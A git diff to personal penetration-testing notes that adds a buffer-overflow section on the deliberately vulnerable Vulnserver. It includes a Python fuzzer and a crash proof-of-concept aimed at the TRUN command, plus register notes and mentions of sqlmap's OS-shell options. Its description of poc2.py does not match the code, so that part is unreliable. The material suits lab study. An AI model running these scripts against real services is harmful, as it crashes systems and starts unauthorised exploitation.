@@ -126,9 +126,6 @@ In kali
 Shortcut "Print": `flameshot gui -s`  
 Shortcut "Shift+Print": `flameshot gui`
 
-## Immunity debugger
-https://immunityinc.com/products/debugger/
-
 # Pentest
 ## Frameworks
 
@@ -344,6 +341,77 @@ Options:
  - `--os-shell` Prompt for an interactive operating system shell  
 Needs to know which web application language the web server supports
  - `--sql-shell` Prompt for an interactive SQL shell
+
+## Buffer overflow
+
+### Tools
+
+#### Vulnserver
+This server has a buffer overflow vuln
+https://github.com/stephenbradshaw/vulnserver
+
+### Immunity debugger
+Tool to see the memory of a program  
+Use it by binding it to the vulnserver
+https://immunityinc.com/products/debugger/
+
+poc.py
+
+    #!/usr/bin/python
+    
+    import socket
+    import os
+    import sys
+    import time
+    
+    host="10.211.55.7"
+    port=4444
+    
+    buffer=["A"]
+    counter=100
+    while len(buffer) <= 30:
+            buffer.append("A"*counter)
+            counter=counter+200
+    
+    for string in buffer:
+        print "fuzzing TRUN with %s bytes" % len(string)
+        expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        expl.connect((host, port))
+        expl.send("TRUN /.:/" + string)
+        expl.close()
+        time.sleep(1)
+
+poc2.py
+
+    #!/usr/bin/python
+
+    import socket
+    import os
+    import sys
+    
+    host="10.211.55.7"
+    port=4444
+    
+    buffer = "TRUN /.:/" + "A" * 5900
+    
+    expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    expl.connect((host, port))
+    expl.send(buffer)
+    expl.close()
+
+### General
+
+  - ESP: Top of stack
+  - EBP: Bottom of stack
+  - EIP: Pointer to the next instruction to be executed
+
+### Goal
+
+The EIP has not a fixed address and we need to find it
+
+poc.py sends payloads (filled with A) that are every time bigger to see if EIP get overwritten
+
+poc2.py sends a payload (filled with consecutive chars) to find the exact address of the EIP
 
 # Data exfiltration
 ## ICMP - Internet Control Message Protocol
